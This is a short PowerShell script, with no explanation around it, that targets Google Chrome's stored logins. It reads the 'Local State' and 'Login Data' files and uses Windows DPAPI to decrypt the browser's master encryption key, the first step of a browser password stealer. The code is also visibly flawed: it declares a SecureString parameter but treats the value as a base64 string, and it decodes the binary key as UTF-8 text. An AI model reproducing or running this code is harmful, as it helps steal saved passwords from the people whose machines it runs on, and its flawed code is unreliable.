
$ChromeLocalStatePath =  "$env:USERPROFILE\appdata\local\Google\Chrome\User Data\Local State"
$ChromeDefaultCreds = "$env:USERPROFILE\appdata\local\Google\Chrome\User Data\Default\Login Data"

$localStateContent = Get-Content -Path $ChromeLocalStatePath -Raw
$ChromeCredentialsContent = Get-Content -Path $ChromeDefaultCreds -Raw 

$localStateData = $localStateContent | ConvertFrom-Json
$ChromeCredentialsData = $ChromeCredentialsContent 

# Retrieve the key
$crypt = $localStateData.os_crypt.encrypted_key


function Get-EncData {
    param (
        [SecureString]$Password
    )
    $key = [System.Convert]::FromBase64String($password);

    $encryptedPassdata = $key[5..$key.Count]

    
    # Decrypt the sync metadata using DPAPI
    $decryptedPassdata = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedPassdata, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

    # Convert the decrypted data from bytes to a string
    $decryptedPassString = [System.Text.Encoding]::UTF8.GetString($decryptedPassdata)

    return $decryptedPassString
    
}

Get-EncData -Password $crypt

